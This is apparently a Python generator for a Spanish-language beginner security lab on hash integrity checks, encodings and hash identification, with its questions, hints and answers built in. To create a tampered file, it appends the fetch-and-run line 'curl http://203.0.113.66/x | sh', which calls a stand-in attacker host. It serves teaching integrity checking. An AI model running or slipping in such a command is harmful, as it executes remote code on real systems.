#!/usr/bin/env python3
"""N1·03 — Hashes, integridad y codificaciones.
Genera ficheros de una «descarga» con su lista SHA256SUMS (uno alterado) y mensajes codificados."""
import base64
import codecs
import hashlib
import pathlib
import sys

sys.path.insert(0, str(pathlib.Path(__file__).resolve().parents[2] / "_comun"))
from lab import Lab  # noqa: E402

lab = Lab(__file__, "N1·03 · Hashes, integridad y codificación", 103)
r = lab.rng
PAL = ["cortafuegos", "criptografia", "honeypot", "bastion", "telemetria", "segmentacion", "parche", "auditoria"]

# 1) integridad: SHA256SUMS de 6 ficheros, uno ha sido manipulado después
nombres = ["instalador.sh", "manual.pdf.txt", "config.yml", "README.txt", "licencia.txt", "cambios.txt"]
sumas = []
for n in nombres:
    contenido = f"Contenido original de {n}\n" + "x" * r.randint(50, 400) + "\n"
    lab.escribir(f"descarga/{n}", contenido)
    sumas.append(f"{hashlib.sha256(contenido.encode()).hexdigest()}  {n}")
lab.escribir("descarga/SHA256SUMS", "\n".join(sumas) + "\n")
alterado = r.choice(nombres)
p = lab.datos / "descarga" / alterado
p.write_text(p.read_text() + "curl http://203.0.113.66/x | sh   # añadido por un atacante\n")

# 2) mensajes codificados
m_b64 = r.choice(PAL)
m_hex = r.choice([w for w in PAL if w != m_b64])
m_rot = r.choice([w for w in PAL if w not in (m_b64, m_hex)])
doble = r.choice([w for w in PAL if w not in (m_b64, m_hex, m_rot)])
lab.escribir("mensajes.txt", "\n".join([
    "# Cada línea esconde una palabra. Identifica la codificación y decodifícala.",
    "A: " + base64.b64encode(m_b64.encode()).decode(),
    "B: " + m_hex.encode().hex(),
    "C: " + codecs.encode(m_rot, "rot13"),
    "D: " + base64.b64encode(base64.b64encode(doble.encode())).decode(),
]) + "\n")

# 3) identificar tipos de hash por su longitud
pal_hash = r.choice(PAL)
tipos = [("md5", hashlib.md5), ("sha1", hashlib.sha1), ("sha256", hashlib.sha256)]
r.shuffle(tipos)
lab.escribir("diccionario.txt", "\n".join(sorted(PAL + ["firewall", "contrasena", "servidor", "phishing", "ransomware", "backup"])) + "\n")
lab.escribir("hashes.txt", "\n".join(f"H{i + 1}: {f(pal_hash.encode()).hexdigest()}" for i, (_, f) in enumerate(tipos)) + "\n")
h_md5 = next(i + 1 for i, (n, _) in enumerate(tipos) if n == "md5")

lab.pregunta("¿Qué fichero de descarga/ NO coincide con SHA256SUMS?", alterado, pista="cd datos/descarga && sha256sum -c SHA256SUMS")
lab.pregunta("¿Qué IP aparece en la línea que añadió el atacante a ese fichero?", "203.0.113.66", pista="tail -n 2 del fichero alterado")
lab.pregunta("Mensaje A (Base64): ¿qué palabra es?", m_b64, pista="echo 'TEXTO' | base64 -d")
lab.pregunta("Mensaje B (hexadecimal): ¿qué palabra es?", m_hex, pista="echo 'TEXTO' | xxd -r -p")
lab.pregunta("Mensaje C (ROT13): ¿qué palabra es?", m_rot, pista="echo 'TEXTO' | tr 'A-Za-z' 'N-ZA-Mn-za-m'")
lab.pregunta("Mensaje D está codificado dos veces. ¿Qué palabra es?", doble, pista="Decodifica Base64 y vuelve a decodificar el resultado.")
lab.pregunta("En hashes.txt, ¿cuál es el MD5? (H1, H2 o H3)", f"H{h_md5}", str(h_md5),
             pista="MD5 = 32 caracteres hex, SHA1 = 40, SHA256 = 64. Cuenta con: awk '{print $1, length($2)}' hashes.txt")
lab.pregunta("¿Qué palabra de diccionario.txt produce esos tres hashes?", pal_hash,
             pista="Prueba candidatas: while read w; do echo -n $w | md5sum | grep -q HASH_MD5 && echo $w; done < diccionario.txt  (¡echo -n, sin salto de línea!)")
lab.terminar()
